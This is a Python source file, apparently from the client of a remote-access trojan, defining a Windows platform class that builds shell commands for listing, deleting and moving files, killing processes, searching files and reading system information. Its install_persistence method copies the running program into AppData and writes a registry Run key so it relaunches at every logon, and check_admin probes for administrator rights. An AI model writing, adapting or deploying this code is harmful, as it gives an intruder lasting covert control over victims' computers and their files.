import os
import subprocess
import shutil
import sys

from client.platform.base import AbstractPlatform


class WindowsPlatform(AbstractPlatform):

    def list_dir_cmd(self, path=None):
        return f'dir "{path}"' if path else 'dir'

    def current_dir_cmd(self):
        return 'cd'

    def delete_cmd(self, path, recursive=False):
        if recursive:
            return f'rmdir /s /q "{path}"'
        return f'del /q "{path}"'

    def move_cmd(self, src, dst):
        return f'move "{src}" "{dst}"'

    def read_file_cmd(self, path):
        return f'type "{path}"'

    def touch_cmd(self, path):
        return f'type nul > "{path}"'

    def process_list_cmd(self):
        return 'tasklist'

    def kill_process_cmd(self, pid):
        return f'taskkill /F /PID {pid}'

    def pkill_cmd(self, name):
        return f'taskkill /F /IM {name}.exe'

    def network_info_cmd(self):
        return 'ipconfig'

    def install_persistence(self, reg_name, copy_name):
        import ctypes
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            file_location = os.path.join(appdata, copy_name)

            if getattr(sys, 'frozen', False):
                shutil.copyfile(sys.executable, file_location)
                run_cmd = f'"{file_location}"'
            else:
                script_path = os.path.abspath(sys.argv[0])
                if os.path.isdir(script_path):
                    script_path = os.path.join(script_path, '__main__.py')
                dest = file_location + '.pyw'
                shutil.copyfile(script_path, dest)
                file_location = dest
                run_cmd = f'pythonw.exe "{file_location}"'

            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v {reg_name} /t REG_SZ /d "{run_cmd}" /f',
                shell=True
            )
            return f'[+] Created persistence with reg key: {reg_name}'
        except Exception as e:
            return f'[-] Persistence error: {e}'

    def get_appdata_path(self):
        return os.environ.get('appdata', os.path.expanduser('~'))

    def check_admin(self):
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        return '[+] User is Admin' if is_admin == 1 else '[-] User is NOT Admin'

    def get_system_user(self):
        try:
            return os.getlogin()
        except Exception:
            return os.environ.get('USERNAME', 'Unknown')

    def get_memory_info(self):
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            c_ulonglong = ctypes.c_ulonglong

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', c_ulonglong),
                    ('ullAvailPhys', c_ulonglong),
                    ('ullTotalPageFile', c_ulonglong),
                    ('ullAvailPageFile', c_ulonglong),
                    ('ullTotalVirtual', c_ulonglong),
                    ('ullAvailVirtual', c_ulonglong),
                ]

            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            gb_mem = round(mem.ullTotalPhys / (1024 ** 3), 2)
            return f"Total RAM: {gb_mem} GB"
        except Exception:
            pass
        return None

    def grep_cmd(self, pattern):
        return f'findstr /s /i /m "{pattern}" *.*'

    def clear_screen_cmd(self):
        return 'cls'
